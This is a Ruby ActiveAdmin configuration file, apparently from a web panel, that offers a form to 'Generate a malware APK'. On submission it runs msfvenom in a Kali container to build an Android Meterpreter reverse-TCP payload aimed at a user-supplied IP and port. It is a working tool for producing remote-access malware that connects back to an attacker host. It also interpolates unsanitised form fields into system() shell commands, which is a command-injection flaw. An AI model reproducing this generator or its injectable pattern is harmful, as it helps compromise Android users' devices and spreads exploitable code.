ActiveAdmin.register ApkPayload do
  menu priority: 3, label: "Generate APK"

  form title: 'Generate a malware APK' do |f|
    inputs do
      f.input :destination_ip
      f.input :destination_port
      f.input :name
      #li "Created at #{f.object.apk_payload_id}" unless f.object.new_record?
      #input :status
    end
    para "Make sure the IP is reachable and the port is open."
    actions
  end

    after_create do |apk_payload|
        begin
            generateApkCommand="docker exec -u 0 kali_container sh -c \"/usr/bin/msfvenom -p android/meterpreter/reverse_tcp " \
                                "LHOST=#{apk_payload.destination_ip} LPORT=#{apk_payload.destination_port}  R > /root/#{apk_payload.name}.apk\""
            sleep 1
            copyApkCommand="docker cp kali_container:/root/#{apk_payload.name}.apk payloads\\#{apk_payload.name}.apk"
            system(generateApkCommand)
            system(copyApkCommand)
        rescue
          puts "Error generating APK"
        end
    end

  # See permitted parameters documentation:
  # https://github.com/activeadmin/activeadmin/blob/master/docs/2-resource-customization.md#setting-up-strong-parameters
  #
  # Uncomment all parameters which should be permitted for assignment
  #
  permit_params :destination_ip, :destination_port, :forwarding_ip, :forwarding_port, :name
  #
  # or
  #
  # permit_params do
  #   permitted = [:destination_ip, :destination_port, :forwarding_ip, :forwarding_port]
  #   permitted << :other if params[:action] == 'create' && current_user.admin?
  #   permitted
  # end
  
end
